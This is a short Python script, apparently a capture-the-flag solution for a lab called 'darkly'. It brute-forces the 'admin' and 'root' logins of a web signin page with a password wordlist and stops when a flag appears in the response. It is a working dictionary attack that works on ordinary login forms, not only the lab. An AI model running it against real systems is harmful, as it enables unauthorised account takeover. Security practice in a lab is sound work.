import os
import requests
import re

ip = os.getenv('darkly_ip')
baseurl = f'http://{ip}'
reg = re.compile('The flag is : ([a-z0-9]+) <')

def get_word_list():
    with open('wordlist.txt', encoding='latin-1') as f:
        for l in f:
            yield l

def try_login(username, password):
    print(f'Trying {username}:{password}          ', end='\r')
    r = requests.get(f'{baseurl}/index.php?page=signin&username={username}&password={password}&Login=Login#')
    m = re.findall(reg, r.text)
    if m:
        return m[0]

if __name__ == '__main__':
    wl = get_word_list()

    for u in ('admin', 'root'):
        for w in wl:
            flag = try_login(u, w[:-1])
            if flag:
                print(f'Found flag {flag} with {u}:{w}')
                exit()

    